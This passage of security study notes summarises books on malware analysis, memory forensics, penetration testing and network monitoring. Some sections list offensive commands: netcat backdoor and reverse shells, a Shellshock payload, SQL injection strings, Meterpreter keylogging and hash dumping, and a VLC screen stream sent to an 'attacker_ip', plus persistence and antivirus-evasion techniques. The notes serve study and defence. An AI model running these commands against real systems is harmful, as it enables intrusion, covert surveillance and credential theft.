- Access tokens and impersonation

### User-Mode Rootkit Techniques
- IAT Hooking: Modify import address table
- Inline Hooking: Overwrite function prologue with JMP (trampoline)

### Data Encoding (Ch 13)
- XOR encoding: single/multi-byte keys, rolling XOR
- Base64, custom encoding
- Identifying encoding via entropy analysis, statistical patterns

### Network Signatures (Ch 14)
- HTTP User-Agent strings, URI patterns
- DNS queries (DGA - Domain Generation Algorithms)
- Custom protocol signatures
- Beacon detection (periodic communication patterns)

## Anti-Reverse-Engineering (Ch 15-18)

### Anti-Disassembly
- Jump instructions with same target, opaque predicates
- Disrupting disassembly flow alignment

### Anti-Debugging
- IsDebuggerPresent, CheckRemoteDebuggerPresent
- NtGlobalFlag, NtQueryInformationProcess
- Timing checks (RDTSC, GetTickCount)
- TLS callbacks (execute before EntryPoint)

### Anti-VM Techniques
- VM artifact detection: registry keys, MAC addresses, hardware IDs
- Red Pill: SIDT/SGDT/LSL instructions to detect VM presence
- VMware backdoor I/O port (0x5658/'VX')

### Packers and Unpacking
- UPX, ASPack, Themida, etc.
- Identify: PEiD, section names (UPX0, UPX1), entropy, small import table
- Unpacking: OEP finding, dumping with OllyDump/Scylla, import reconstruction

## x86 Disassembly Key Points
- Registers: EAX, EBX, ECX, EDX, ESI, EDI, EBP, ESP
- Calling conventions: cdecl (caller cleans), stdcall (callee cleans), fastcall (ECX/EDX)
- Key API functions for malware analysis (Appendix A)

## WinDbg Kernel Debugging (Ch 10)
- `!drvobj DriverName`: View driver object
- `dt nt!_DRIVER_OBJECT address`: Overlay structure
- `dd address+L`: Dump DWORDs
- `u address`: Unassemble
- `lm`: List loaded modules
- `x nt!*CreateProcess*`: Search symbols
- `ln address`: Find nearest symbol
- `bu $iment(driverName)`: Breakpoint on driver entry
- Symbol path: `SRV*c:\websymbols*http://msdl.microsoft.com/download/symbols`
- `IRP_MJ_DEVICE_CONTROL`: Index 0xe in major function table

---

# 14. THE ART OF MEMORY FORENSICS (46499 lines)
**By Ligh, Case, Levy, Walters - The Volatility Framework Bible**

## Volatility Framework
- Open-source memory forensics platform
- Profiles: Win2003SP1x86, Win7SP1x64, Win2012R2x64, etc.

## Memory Acquisition Tools
- WinPmem, F-Response, FTK Imager, DumpIt, Belkasoft
- Linux: LiME, fmem
- Mac: MacMemoryReader, osxpmem
- Formats: raw/dd, crash dump, hibernation file, VMware .vmem

## Key Volatility Plugins by Category

### Process Analysis
- `pslist`: List processes via EPROCESS list
- `psscan`: Carve processes via pool tag scanning
- `pstree`: Process tree (parent-child)
- `psxview`: Cross-view comparison (detect hidden processes)

### DLL/Module Analysis
- `dlllist`: List loaded DLLs via PEB
- `ldrmodules`: Detect unlinked/hidden DLLs (cross-references 3 PEB lists)
- `modscan`: Carve kernel modules via pool scanning
- `moddump`: Dump kernel driver from memory

### Process Memory
- `memdump`: Dump all process memory pages
- `procdump`: Dump process executable (PE file)
- `dlldump`: Dump DLL from memory
- `vaddump`: Dump VAD regions
- `vadinfo` / `vadtree`: VAD information and tree view

### Code Injection Detection
- **Malfind**: Detect injected code (PAGE_EXECUTE_READWRITE, no mapped file, suspicious headers)
- **Apihooks**: Detect IAT/EAT/Inline hooks in user/kernel mode
- **Callbacks**: Enumerate kernel callbacks (PsSetCreateProcessNotifyRoutine, etc.)

### Network Analysis
- `connections`: Active TCP connections (XP/2003)
- `connscan`: Carve TCP connections via pool scanning
- `sockets`: Open socket handles
- `sockscan`: Carve sockets via pool scanning
- `netscan`: Network artifacts for Vista+ (includes UDP, listeners)

### Registry Analysis
- `hivelist`: List registry hives in memory
- `printkey`: Print registry key contents
- `hivedump`: Dump all keys/values from a hive
- `dumpregistry`: Extract userassist, shimcache, shellbags
- `hashdump`: Dump LM/NTLM password hashes from SAM
- `lsadump`: Dump LSA secrets

### Malware Detection
- `svcscan`: Scan for Windows services
- `devicetree`: Display device tree
- `driverscan`: Scan for driver objects
- `ssdt`: Display SSDT (System Service Descriptor Table) entries - detect hooks
- `idt`: Display IDT entries
- `gdt`: Display GDT entries

### Advanced Hunting
- `yarascan`: Scan memory with YARA rules
- `strings`: Extract strings from memory images
- `timeliner`: Generate timeline from memory artifacts
- `mftparser`: Parse MFT entries from memory (disk artifacts)

## YARA Rules in Memory
- Scan process memory for malware signatures
- YARA syntax: strings, conditions, hex patterns
- Plugin development: zeusscan2, Poison Ivy config extractors, PlugX, DarkComet

## Process Memory Internals (Ch 7-8)
- PEB: Process Environment Block (ImageBaseAddress, Ldr, ProcessParameters)
- VAD (Virtual Address Descriptor) tree
- _PEB_LDR_DATA: InLoadOrderModuleList, InMemoryOrderModuleList, InInitializationOrderModuleList
- _LDR_DATA_TABLE_ENTRY: DllBase, EntryPoint, SizeOfImage, FullDllName, BaseDllName, LoadCount
- Environment variables (PATH hijacking, PATHEXT manipulation)
- Coreflood presence marking via environment variables
- Heap analysis: finding Notepad text via heap inspection

## Rootkit Detection (Ch 13)
- SSDT hooking: Replace kernel function pointers
- IDT hooking: Interrupt descriptor table modifications
- DKOM (Direct Kernel Object Manipulation): Unlink processes from EPROCESS list
- Driver hiding via module list manipulation

---

# 15. THE HACKER PLAYBOOK 2 (8706 lines)
**By Peter Kim - Practical Penetration Testing**

## PTES Methodology Adapted
1. Intelligence Gathering
2. Initial Foothold
3. Local/Network Enumeration
4. Local Privilege Escalation
5. Persistence
6. Lateral Movement
7. Domain Privilege Escalation
8. Dumping Hashes
9. Data Identification/Exfiltration
10. Reporting

## Lab Setup
- Metasploitable2, OWASPBWA (OWASP Broken Web Apps)
- Build Active Directory: Windows 2012 R2 DC + Windows 8/7 clients

## OSINT Tools
- **Recon-ng**: Web recon framework
- **Discover Scripts**: Automated OSINT collection
- **Spiderfoot**: Automated OSINT
- **Wordhound/Brutescrape**: Password list creation
- **Gitrob**: GitHub analysis for sensitive data
- **Masscan**: Fast port scanning
- **Sparta**: GUI automation for scanning
- **http-screenshot**: Visual reconnaissance

## Exploitation
- Metasploit: MS08-067, WarFTP, Shellshock, Heartbleed
- Shellshock: `() { :;}; /bin/bash -c 'command'`
- Git repository dumping: `wget --mirror -I .git`
- NoSQLmap: NoSQL injection tool
- Elastic Search exploitation

## Web Application Testing
- Manual SQL Injection: `' or 1=1--`, UNION SELECT
- XSS: Stored, reflected, DOM-based
- CSRF: Token bypass methods
- Session token analysis
- Functional/Business Logic testing

## Lateral Movement
- **Without credentials**: Responder.py (LLMNR/NBT-NS poisoning), ARP spoofing (Cain/Abel, Ettercap), Backdoor Factory Proxy
- **With domain credentials**: PSExec, WMI, MS14-068 (Kerberos exploit), Pass-The-Ticket, SMBExec
- **Postgres lateral movement**: Pass-the-hash via Postgres
- **Domain Controller attacks**: PSExec_NTDSgrab, Golden Ticket, Skeleton Key, Sticky Keys

## Persistence
- Veil-Evasion + PowerShell payloads
- Scheduled Tasks
- Golden Ticket (KRBTGT hash)
- Skeleton Key (LSASS patching)
- Sticky Keys (sethc.exe replacement)

## AV Evasion
- **Backdoor Factory**: PE binary patching with shellcode
- **Veil-Evasion**: Payload generation
- **Powershell without powershell.exe**: WMI, COM objects
- **PeCloak.py**: PE encoding
- **Nishang/PowerSploit**: PowerShell post-exploitation

## Password Cracking
- John the Ripper, OclHashcat (GPU)
- Password lists: rockyou.txt, CrackStation

## Special Techniques
- Kali Nethunter: Mobile pentesting platform
- Rubber Ducky: USB HID attack
- Pwnie Express: Drop box server
- Badge Cloning: Proxmark3
- Pivoting: Metasploit route add, proxychains, SSH tunneling

## Commercial Tools
- Cobalt Strike, Immunity Canvas, Core Impact
- Tenable Nessus, Rapid7 Nexpose

---

# 16. RED TEAM FIELD MANUAL (RTFM) (12658 lines)
**By Ben Clark - Command Reference**

## Linux Network Commands
```bash
watch ss -tp                              # Network connections
netstat -ant / netstat -tulpn             # TCP/UDP connections
lsof -i                                   # Established connections
smbclient -U user \\\\ip\\share           # SMB connect
ifconfig eth# ip/cidr                    # Set IP
route add default gw gw_ip               # Set gateway
macchanger -m MAC int                    # Change MAC
dig -x ip / host ip                      # Reverse lookup
host -t SRV _service._tcp.url.com        # SRV lookup
dig @ip domain -t AXFR / host -l domain namesvr  # Zone transfer
tcpkill host ip and port port            # Block IP:port
echo "1" > /proc/sys/net/ipv4/ip_forward # Enable forwarding
```

## Linux System Info
```bash
id / w / who -a / last -a                 # User info
ps -ef / df -h / uname -a                 # System info
mount / getent passwd                    # Filesystem/users
rpm -qa / dpkg --get-selections / pkginfo # Package listing
which tcsh/csh/ksh/bash                   # Find shell
chmod -s tcsh/csh/ksh/bash                # Disable shell
```

## Linux Utility
```bash
wget http://url -O url.txt -o /dev/null
rdesktop ip
useradd -m user / passwd user / rmuser username
script -a outfile                        # Record shell session
apropos subject / history / !num
```

## Netcat
```bash
nc [TargetIP] [port]                     # Connect
nc -l -p [port]                          # Listener
nc -v -n -z -w1 [IP] [start]-[end]       # Port scanner
nc -l -p [port] -e /bin/bash             # Backdoor shell
nc [LocalIP] [port] -e /bin/bash         # Reverse shell
```

## Metasploit
```bash
msfconsole -r file.rc                    # Load resource file
msfcli | grep exploit/window             # List exploits
msfpayload / msfencode                   # Payload/encode
show exploits/auxiliary/payloads
search string / info module / use module
set option value / show options / show advanced
sessions -l / sessions -s script / sessions -k #
exploit -j                               # Run as job
route add ip netmask session_id          # Pivot
```

### Meterpreter
```
help / sysinfo / ps / getpid / getuid
upload / download / shell / migrate PID
keyscan_start / keyscan_dump / keyscan_stop
hashdump / run script / getsystem
use incognito / list_tokens -u / impersonate_token
portfwd add -L 0.0.0.0 -l 443 -r target -p 3389
```

### Pivoting Through Meterpreter
```bash
route add 3.3.3.0 255.255.255.0 session_id
use auxiliary/server/socks4a
# Then: proxychains nmap -sT -Pn -p80,443,445 target
```

## SSH Tunneling
```bash
ssh -R 8080:127.0.0.1:443 root@target    # Remote port forward
ssh -L 8080:3.3.3.3:443 root@target      # Local port forward
ssh -D 1080 root@target                   # Dynamic tunnel (SOCKS)
proxychains nmap -sT -p80,443 3.3.3.3    # Use with proxychains
```

## Ettercap
```bash
ettercap -I iface -M arp -Tq -F file.ef MACs/IPs/Ports  # MITM with filter
ettercap -T -M arp -F filter // //                       # MITM entire subnet
ettercap -TP rand_flood                                   # Switch flood
etterfilter filter.filter -o out.ef                      # Compile filter
```

## VLC Screen Capture
```bash
vlc screen:// :screen-fps=25 --sout='#transcode{vcodec=h264}:udp{dst=attacker_ip:1234}'
```

---

# 17. NETWORK FORENSICS 2012 (28492 lines)
**Sherri Davidoff & Jonathan Ham**

## Packet Analysis Methodology
1. Protocol identification
2. Packet isolation
3. Flow reconstruction
4. Higher-layer protocol analysis

## Higher-Layer Protocols
- SMTP: HELO -> MAIL FROM -> RCPT TO -> DATA; SMTP Auth (AUTH PLAIN with Base64 credentials)
- DNS: query-response over UDP; zone transfers (AXFR) over TCP; can be used for covert channels

## Analysis Tools
- **oftcat**: OFT protocol dissector and file carver
- **smtpdump**: SMTP analysis; `-x` extract attachments; `-A` auth info; `-e` email info
- **findsmtpinfo.py**: Auto-extract SMTP auth, attachments, MD5 hashes
- **NetworkMiner**: Multipurpose traffic analysis (Windows GUI); auto-carves files, identifies hosts
- **tcpflow**: Flow reassembly
- **Wireshark**: Protocol hierarchy statistics; display filters

## SMTP Authentication Analysis
- Base64-encoded credentials: `dGVzdAB0ZXN0ADEyMzQ=` decodes to "testtest1234"
- Use `base64` command to decode

## DNS Analysis
- `dig www.google.com` - A record query
- `dig @ns.google.com www.google.com` - Query specific nameserver
- `dig @ns.modwest.com 204.11.246.86 PTR` - Reverse DNS
- `dig lmgsecurity.com NS` - Nameserver delegation
- Zone transfers over TCP port 53 often blocked

---

# 18. (ISC)2 CCSP CBK (29002 lines)

## Cloud Data Security (Domain 2)
- Data classification driven by P&DP (Privacy & Data Protection) laws
- Primary entities: scope/purpose, data categories, processing categories
- Secondary entities: data location allowed, user categories, retention, security measures, breach constraints, status

## Privacy Level Agreement (PLA)
- CSA-defined standard for cloud provider privacy commitments
- Covers: privacy contacts, prohibited data categories, processing methods, data transfers, security measures, monitoring, audits, breach notification, data portability, retention/deletion, accountability, cooperation

## Key Privacy Cloud Factors (WP29)
- Contractual clarity between customer and cloud provider
- Data location, sub-processors, security certifications (ISO 27001, NIST SP 800-53, CSA CCM)

---

# 19. WSTG v4.1 / OWASP TESTING GUIDE (21470 + 21246 lines)

## Configuration Management Testing (WSTG-CONF)
- **WSTG-CONF-05**: Enumerate admin interfaces
  - Directory brute-forcing: /admin, /administrator, Google dorks
  - Source code comments and links
  - Default credentials lists
  - Parameter tampering (hidden fields, cookies)
  - Framework-specific paths:
    - WebSphere: /admin, /admin-authz.xml, /admin.conf
    - PHP: /phpinfo, /phpmyadmin/, /phpMyAdmin/
    - FrontPage: /admin.dll, /admin.exe, /author.dll
    - WebLogic: /AdminCaptureRootCA, /AdminClients, /AdminJDBC
    - WordPress: wp-admin/, wp-admin/admin-ajax.php
  - Tools: OWASP ZAP (Forced Browse), THC-HYDRA, FuzzDB

- **WSTG-CONF-06**: HTTP Methods Testing
  - Methods: HEAD, GET, POST, PUT, DELETE, TRACE, OPTIONS, CONNECT
  - Dangerous: PUT (file upload), DELETE, CONNECT (proxy), TRACE (XST)
  - Check with: `nc target 80` → `OPTIONS / HTTP/1.1`
  - nmap: `nmap -p 443 --script http-methods localhost`
  - Cross-Site Tracing (XST): bypasses HttpOnly cookie flag
  - HEAD access control bypass: some frameworks treat HEAD as GET without auth
  - Arbitrary methods bypass: JEFF, CATS treated as GET

- **WSTG-CONF-07**: HTTP Strict Transport Security testing

---

# 20. PENETRATION TESTING - HANDS-ON INTRO TO HACKING (21301 lines)
**By Georgia Weidman**

## Information Gathering
- **theHarvester**: Email addresses, subdomains from Google, Bing, PGP
- **Maltego**: Visual OSINT
- **Nmap**:
  - SYN scan: `nmap -sS 192.168.20.10-12`
  - Version scan: `nmap -sV 192.168.20.10-12 -oA bookversionnmap`
  - UDP scan: `nmap -sU 192.168.20.10-12 -oA bookudp`
  - Specific port: `nmap -sS -p 3232 192.168.20.10`
  - All ports: `-p 1-65535`

## Vulnerability Analysis
- **Nessus**: `service nessusd start` → web interface at https://kali:8834
  - Policies: Basic Network Scan, Internal/External, credentials
  - Scan results: critical/high/medium/low/info

## Example Vulnerabilities Found
- Vsftpd 2.3.4 (backdoored binary - smiley face trigger)
- SLMail 5.5 (buffer overflow on POP3)
- Apache with mod_ssl/OpenSSL
- Zervit 0.4 web server (crashes on scan)

---

# 21. THE PRACTICE OF NETWORK SECURITY MONITORING (17633 lines)
**By Richard Bejtlich - Security Onion Deployment**

## Security Onion (SO) Components
- **Sguil**: Analyst console for NSM
- **Snort/Suricata**: NIDS alert data
- **Bro** (now Zeek): Network analysis framework
- **netsniff-ng**: Full packet capture
- **pcap_agent, snort_agent, sancp_agent, pads_agent, http_agent**: Sguil agents
- **PRADS**: Passive Real-time Asset Detection System
- **Argus**: Network flow data
- **ELSA**: Enterprise Log Search and Archive
- **Snorby**: Web-based frontend
- **OSSEC**: Host-based IDS

## Distributed Deployment
- SO server + sensors (autossh tunnels)
- Setup wizard: `sudo sosetup`
- Verify: `sudo service nsm status`
- Autossh verification: `ps aux | grep autoss[h]` or `pgrep -lf autossh`

## SO via PPAs
- `sudo add-apt-repository -y ppa:securityonion/stable`
- `sudo apt-get install securityonion-server`
- `sudo apt-get install securityonion-elsa securityonion-elsa-extras`

## Static IP Configuration
- Edit `/etc/network/interfaces`:
```
auto eth0
iface eth0 inet static
address 192.168.2.128
netmask 255.255.255.0
gateway 192.168.2.1
dns-nameservers 172.16.2.1
```
- `sudo /etc/init.d/networking restart`

---

# 22. PACKET ANALYSIS WITH WIRESHARK (5029 lines)
**Practical packet analysis techniques**

## Wireshark Core Functions
- Protocol Hierarchy Statistics
- Display filters: `ip.addr ==`, `tcp.port ==`, `http.request`, `dns`
- Follow TCP Stream
- Export Objects (HTTP, SMB, etc.)

## Key Display Filters
- MAC: `eth.addr == 00:21:70:4D:4F:AE`
- IP: `ip.src == 192.168.1.1 && ip.dst == 192.168.1.2`
- Protocols: `http`, `dns`, `dhcp` (Bootstrap Protocol), `smtp`

## PCAP Tools
- **tshark**: `tshark -r capture.pcap -Y "http.request"`
- **tcpdump**: `tcpdump -r capture.pcap -nn`
- **editcap/mergecap**: Pcap manipulation
- **NetworkMiner**: Automated extraction

---

# 23. CYBERSECURITY FUNDAMENTALS (9003 lines)
**ISACA Study Guide**

## CIA Triad
- Confidentiality: Access controls, file permissions, encryption
- Integrity: Logging, digital signatures, hashes, encryption, access controls
- Availability: Redundancy, backups, access control

## NIST/ENISA 5 Functions
1. **Identify**: Understand risk to systems, assets, data
2. **Protect**: Safeguards for critical services
3. **Detect**: Identify cybersecurity events
4. **Respond**: Action after security event
5. **Recover**: Resilience and timely repair

## Security Architecture
- OSI Model (7 layers)
- Defense in Depth
- Firewalls, Isolation and Segmentation
- Monitoring, Detection, Logging
- Encryption Fundamentals, Techniques, Applications

## Key Topics
- Risk assessment and management
- Vulnerability management
- Penetration testing
- Network, OS, Application, Data security
- Incident response and forensics
- APTs, mobile, BYOD, cloud

---

# 24. PRACTICAL REVERSE ENGINEERING (26301 lines)
**Focus: x86/x64, ARM, Windows Kernel**

## Key Topics (from TOC/scanning)
- x86/x86-64 architecture and assembly
- ARM architecture
- Windows kernel debugging
- Debugging and automation
- Obfuscation techniques
- Page table manipulation
- IDA Pro advanced usage: scripting, FLIRT signatures, type libraries

---

# 25. MALWARE ANALYST'S COOKBOOK AND DVD (39362 lines)
**By Michael Hale Ligh et al. - Companion to Art of Memory Forensics**

## Key Topics (from scanning)
- Malware analysis environments
- Static and dynamic analysis recipes
- Python scripting for malware analysis automation
- YARA rule creation
- Memory forensics with Volatility recipes
- Network traffic analysis recipes
- Anti-analysis techniques and countermeasures
- Shellcode analysis
- Document malware analysis

---

# 26. ADDITIONAL BOOKS COVERED

### OWASP Testing Guide v4
- Mirrors WSTG v4.1 structure
- Comprehensive testing for: Information Gathering, Configuration Management, Identity Management, Authentication, Authorization, Session Management, Input Validation, Error Handling, Cryptography, Business Logic, Client-Side

### The Hacker Playbook 2
See detailed extraction above (section 15)

### Packet Analysis with Wireshark
See section 22 above

### Windows Malware Analysis Essentials
- Windows internals for malware analysis
- PE format deep dive
- Process injection techniques
- Shellcode analysis on Windows

### Advanced Penetration Testing
- "Hacking the World's Most Secure Networks"
- Advanced persistence techniques
- Multi-stage attacks
- APT simulation

### AWS Security Baseline Playbook
- Cloud security controls for AWS
- SCP implementation patterns
- GuardDuty, CloudTrail, Config, Security Hub automation

### OWASP API Security Top 10
- API-specific vulnerabilities
- Broken Object Level Authorization
- Broken Authentication
- Excessive Data Exposure
- Lack of Resources & Rate Limiting

---

# COMPREHENSIVE TOOL LIST

## Reconnaissance/OSINT
theHarvester, Maltego, Metagoofil, Recon-ng, Spiderfoot, Discover Scripts, Gitrob, Shodan, Google Dorks, DNSRecon, Fierce

## Scanning
Nmap, Masscan, Nessus, OpenVAS, Sparta, http-screenshot, ZAP Proxy

## Exploitation
Metasploit Framework, SET, SQLmap, NoSQLmap, BeEF, commix (command injection)

## Password Attacks
John the Ripper, Hashcat/OclHashcat, THC-Hydra, Medusa, CeWL, Crunch, Wordhound

## Web Application
Burp Suite, OWASP ZAP, DirBuster/Forced Browse, wfuzz, ffuf, gobuster, Nikto, WPScan

## Wireless
Aircrack-ng suite, Wifite, Reaver, Kismet, Airgeddon

## Post-Exploitation
Mimikatz, PowerSploit, Nishang, Empire, BloodHound, CrackMapExec, PSExec, SMBExec, WMI

## Malware Analysis
IDA Pro, Ghidra, OllyDbg, x64dbg, WinDbg, PEiD, PEview, Resource Hacker, Dependency Walker, Process Monitor, Process Explorer, Regshot, ApateDNS, INetSim, Wireshark, FLOSS, strings

## Memory Forensics
Volatility Framework, Rekall, WinPmem, DumpIt, FTK Imager, LiME, fmem

## Network Forensics/Monitoring
Security Onion, Snort, Suricata, Bro/Zeek, Sguil, ELSA, NetworkMiner, tcpdump, tshark, tcpflow, editcap, Netcat

## Crypto
OpenSSL, GnuPG, John the Ripper, Hashcat, CyberChef

## AV Evasion
Veil-Evasion, Shellter, Backdoor Factory, PeCloak.py, msfvenom

## Cloud Security
ScoutSuite, Prowler, CloudMapper, AWS CLI security tools

---

# METHODOLOGY SUMMARY

## Penetration Testing (PTES-based)
1. Pre-engagement Interactions
2. Intelligence Gathering (OSINT, passive/active recon)
3. Threat Modeling (asset/business analysis)
4. Vulnerability Analysis (scanning, research, manual)
5. Exploitation (initial access, priv esc)
6. Post-Exploitation (persistence, lateral movement, data exfil)
7. Reporting

## Malware Analysis
1. Basic Static (hashing, strings, PE headers, AV scanning)
2. Basic Dynamic (sandbox, procmon, regshot, network sim)
3. Advanced Static (IDA Pro, disassembly, code analysis)
4. Advanced Dynamic (OllyDbg, WinDbg, kernel debugging)

## Memory Forensics
1. Acquisition (WinPmem, DumpIt, LiME)
2. Process/DLL enumeration (pslist, dlllist, ldrmodules)
3. Network artifact recovery (netscan, connections)
4. Code injection detection (malfind, apihooks)
5. Registry analysis (hivelist, printkey, hashdump)
6. Malware signature scanning (yarascan)

## Network Security Monitoring
1. Full packet capture (netsniff-ng, tcpdump)
2. NIDS (Snort/Suricata alert data)
3. NSM (Bro/Zeek protocol analysis)
4. Session data (Argus flow)
5. Asset detection (PRADS)
6. Log aggregation (ELSA, Snorby)

## Blue Team (NIST CSF)
1. Identify (asset inventory, risk assessment)
2. Protect (firewalls, GPO, patching, app whitelisting)
3. Detect (IDS/IPS, log auditing, honey techniques)
4. Respond (live triage, malware analysis, memory acquisition)
5. Recover (patching, backup restoration, process termination)
